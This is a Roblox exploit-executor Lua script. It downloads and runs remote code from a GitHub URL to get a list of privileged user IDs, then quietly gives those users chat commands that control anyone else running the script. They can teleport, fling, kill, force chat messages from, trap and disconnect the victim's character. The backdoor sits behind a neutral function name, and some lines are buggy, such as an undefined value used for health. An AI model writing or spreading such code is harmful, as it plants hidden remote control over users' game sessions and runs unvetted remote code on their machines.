local function AssignBotData()

if dissty then dissty() end
local Players = game:GetService("Players")
local lp = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() and Players.LocalPlayer
lpuserid = lp.UserId
local conn = loadstring(game:HttpGet("https://raw.githubusercontent.com/ieufhosivdlkjv/TXX-LoadSecurity/main/PremiumUserSec"))()

local SayMessageRequest
local commandz
function getmainchar(v)
    if not v then v = lp end
    return v.Character or v.CharacterAdded:Wait()
end
local function gethumanoidpart(v)
    if not v then v = lp end
    return getmainchar(v):WaitForChild("Humanoid")
end
local function getrootpart(v)
    if not v then v = lp end
    local humanoid = gethumanoidpart(v)
    repeat task.wait() until humanoid.RootPart
    return humanoid.RootPart
end
local function gethumrootpart(v)
     if not v then v = lp end
     local chr = getmainchar(v)
     repeat task.wait() until chr.HumanoidRootPart
     return chr.HumanoidRootPart
end
local function Say(...)
    if not SayMessageRequest then
        SayMessageRequest = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
    end
    SayMessageRequest:FireServer(tostring(...),"All")
end
commandz = {
    [":bring"] = function(speaker)
        getrootpart().CFrame = getrootpart(speaker).CFrame
    end,
    [":spameff"] = function(Value)
    getgenv().spameff = Value
    while getgenv().spameff == true do task.wait(.2)
    s = require(game:GetService("ReplicatedStorage").devv.client.Objects.v3item.bin.Fists.modules.controller)
    x = getupvalues(getupvalues(getupvalues(s.meleeFunctions)[2])[5])[1].data
    pcall(x.confetiiiiiiiiiiiii)
    end
    end,
    [":fling"] = function()
    gethumrootpart().AssemblyLinearVelocity = Vector3.new(99999,99999,99999)
    end,
    [":kill"] = function()
        gethumanoidpart().Health = die
    end,
    [":say"] = function(...)
        Say(...)
    end,
    [":tetrax"] = function()
        Say("TeTraX Lil Bro Here, You've found me!")
    end,
    [":hide"] = function()
        local Part
        Part = Instance.new("Part", game:GetService("Workspace"))
        Part.Anchored = true
        Part.Size = Vector3.new(30, 30, 30)
        Part.CFrame = CFrame.new(0,-400,0)
        Part.CanCollide = true
        getrootpart().CFrame = Part.CFrame * CFrame.new(0, 5, 0)
    end,    
    [":leave"] = function()
        game.shutdown(game)
    end
}


function initi()
for l,v in pairs(Players:GetPlayers()) do
    if conn[table.find(conn,v.UserId)] == v.UserId then
        v.Chatted:Connect(function(msg)
            local args = msg:split(" ")
            local cmda = args[1]:lower()
            local commandfunc = commandz[cmda]
            if commandfunc then
                commandfunc(v,args)
            end
        end)
    end
end
end

Players.PlayerAdded:Connect(function()
if lpuserid == conn[table.find(conn,lpuserid)] then
else
    if lpuserid ~= conn[table.find(conn,lpuserid)] then
        initi()
    end
end
end)

end


AssignBotData()
